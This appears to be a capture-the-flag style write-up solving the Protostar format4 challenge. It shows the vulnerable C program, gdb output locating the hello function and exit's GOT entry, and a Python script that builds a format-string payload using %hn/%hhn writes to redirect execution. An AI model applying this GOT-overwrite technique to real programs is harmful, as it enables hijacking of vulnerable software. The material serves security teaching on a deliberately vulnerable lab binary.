Our goal is to solve this explotation challenge <i> [format4](https://exploit.education/protostar/format-four/)</i>


# Code to exploit 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}

```
## Problem of code

This is a Format string exploit challenge .
The code passes a string to printf with wrong format.

If the user passes as argv[1] a string like "%x %x %x %x %x" he can read 5 words from the stack 


```c
	#https://owasp.org/www-community/attacks/Format_string_attack

	// This line is safe
	printf("%s\n", argv[1]);

	// This line is vulnerable
	printf(argv[1]);

```

Our goal will be to change the entry of exit function  in global offset table by using %n arguement in vuln-printf.
We want to redirect exit to the function Hello.



We will use gdb to find relevant addresses.

Address of Hello fucntion:

```c
(gdb) disassemble hello
Dump of assembler code for function hello:
0x080484b4 <hello+0>:   push   %ebp
0x080484b5 <hello+1>:   mov    %esp,%ebp

```
Address of exit:

```c
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:    push   %ebp
0x080484d3 <vuln+1>:    mov    %esp,%ebp
0x080484d5 <vuln+3>:    sub    $0x218,%esp
0x080484db <vuln+9>:    mov    0x8049730,%eax
0x080484e0 <vuln+14>:   mov    %eax,0x8(%esp)
0x080484e4 <vuln+18>:   movl   $0x200,0x4(%esp)
0x080484ec <vuln+26>:   lea    -0x208(%ebp),%eax
0x080484f2 <vuln+32>:   mov    %eax,(%esp)
0x080484f5 <vuln+35>:   call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:   lea    -0x208(%ebp),%eax
0x08048500 <vuln+46>:   mov    %eax,(%esp)
0x08048503 <vuln+49>:   call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:   movl   $0x1,(%esp)
0x0804850f <vuln+61>:   call   0x80483ec <exit@plt>

disassemble 0x80483ec
Dump of assembler code for function exit@plt:
0x080483ec <exit@plt+0>:        jmp    *0x8049724
0x080483f2 <exit@plt+6>:        push   $0x30
0x080483f7 <exit@plt+11>:       jmp    0x804837c
End of assembler dump.

(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483f2


```
We want to change the address located in 0x8049724, with the address of hello

```
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080484b4

```


And then with this python code we will do the final explotation

```python
import struct

HELLO_ADDR = struct.pack("I",0x080484b4)

OFFSET = "TTTT"

EXIT_GOT_ADDR = struct.pack("I", 0x8049724)
EXIT_GOT_2_ADDR = struct.pack("I", 0x8049724+1)
EXIT_GOT_3_ADDR = struct.pack("I", 0x8049724+2)
EXIT_GOT_4_ADDR = struct.pack("I", 0x8049724+3)

#we make printf print 33950 characters so the next %n will give the wanted value to EXIT_GOT


#Use any of these 2 exploit strings
#exploit = EXIT_GOT_3_ADDR + EXIT_GOT_ADDR + "%x %x %2030x %hn %31918x %5$hn"
exploit = EXIT_GOT_2_ADDR + EXIT_GOT_ADDR + "%x %x %110x %hhn %46x %5$hhn"

# %hhn means printf will write 1 bytes instead of 4
# %hn means printf will write 2 bytes instead of 4


print exploit
```


```
user@protostar:~$ python /tmp/format.py | /opt/protostar/bin/format4
%$200 b7fd8420                                                                                                       bffff504                                         8049724 
code execution redirected! you win
```
